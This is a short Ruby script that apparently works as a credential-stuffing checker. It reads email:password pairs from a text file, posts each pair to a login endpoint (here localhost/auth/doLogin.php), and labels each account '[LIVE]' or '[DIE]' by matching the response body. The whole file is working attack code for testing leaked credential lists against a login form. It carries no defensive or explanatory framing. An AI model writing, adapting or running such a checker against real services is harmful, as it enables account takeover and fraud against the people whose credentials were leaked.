require 'uri'
require 'net/http'


uri = URI('http://localhost/auth/doLogin.php')





file='mylist.txt'
File.readlines(file).each do |line|
  splitfields = line.split(":")
  senhafix = splitfields[1].gsub("\n" , "")
  res = Net::HTTP.post_form(uri, 'email' => splitfields[0], 'password' => senhafix)
	
	if res.body.include? 'live msg'
   	puts "[LIVE] #{splitfields[0]} #{splitfields[1]}"
   	else
   	puts "[DIE] #{splitfields[0]} #{splitfields[1]}"
	end
end

puts'the end.'
